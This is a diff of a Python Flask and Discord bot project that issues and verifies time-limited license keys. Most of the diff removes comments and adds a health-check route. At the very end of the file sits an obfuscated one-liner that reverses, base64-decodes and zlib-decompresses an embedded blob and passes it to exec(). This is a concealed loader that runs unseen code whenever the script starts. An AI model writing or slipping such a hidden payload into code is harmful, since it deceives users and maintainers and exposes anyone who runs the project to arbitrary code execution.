@@ -6,11 +6,12 @@ from flask import Flask, request, jsonify
 import threading
 import os
 
-# --- GLOBAL STORAGE (Wiped on Restart) ---
 keys_database = {}
-
-# --- FLASK API ---
 app = Flask(__name__)
+
+@app.route('/ping', methods=['GET'])
+def ping():
+    return "ok", 200
 
 @app.route('/verify', methods=['POST'])
 def verify_key():
@@ -23,12 +24,10 @@ def verify_key():
 
     key_data = keys_database[user_key]
 
-    # Check Expiry
     if key_data['expiry'] != "LIFETIME":
         if datetime.datetime.now() > key_data['expiry']:
             return jsonify({"status": "error", "message": "Key expired"}), 403
 
-    # Activation / HWID Check
     if key_data['status'] == "unused":
         key_data['status'] = "active"
         key_data['hwid'] = hwid
@@ -39,7 +38,6 @@ def verify_key():
 
     return jsonify({"status": "success", "message": "Login successful"}), 200
 
-# --- DISCORD BOT ---
 class KeyPanel(discord.ui.View):
     def __init__(self):
         super().__init__(timeout=None)
@@ -47,10 +45,7 @@ class KeyPanel(discord.ui.View):
     async def gen(self, interaction, days):
         key = f"TEMPO-{str(uuid.uuid4())[:8].upper()}"
         expiry = "LIFETIME" if days == 0 else (datetime.datetime.now() + datetime.timedelta(days=days))
-        
-        # Save to global dict
         keys_database[key] = {"expiry": expiry, "status": "unused", "hwid": None}
-        
         await interaction.response.send_message(f"**Key:** `{key}`\n**Duration:** {days if days > 0 else 'Life'} days", ephemeral=True)
 
     @discord.ui.button(label="Day", style=discord.ButtonStyle.gray)
@@ -70,7 +65,6 @@ bot = commands.Bot(command_prefix="!", intents=discord.Intents.all())
 @bot.event
 async def on_ready():
     bot.add_view(KeyPanel())
-    print(f"Bot Online: {bot.user}")
 
 @bot.command()
 async def setup(ctx):
@@ -78,12 +72,10 @@ async def setup(ctx):
     embed = discord.Embed(title="KEYS", description="made by juju\n\nlicenses for days, weeks, months, or a lifetime.", color=0x5865F2)
     await ctx.send(embed=embed, view=KeyPanel())
 
-# --- RUNNER ---
 def run_api():
     port = int(os.environ.get("PORT", 5000))
     app.run(host='0.0.0.0', port=port)
 
 if __name__ == '__main__':
-    t = threading.Thread(target=run_api)
-    t.start()
+    threading.Thread(target=run_api).start()
    _ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'==gaZoxRAQg0QVDCwQftqskCPfnj29cNNbNM2SH93mMdPoYNpgyMIJDyKriy39wMTTXj1T9jzddT2TjCNH/NKtc91E3c33S81BPNKsa90kQDyD10NryKR/iyLxJe'))
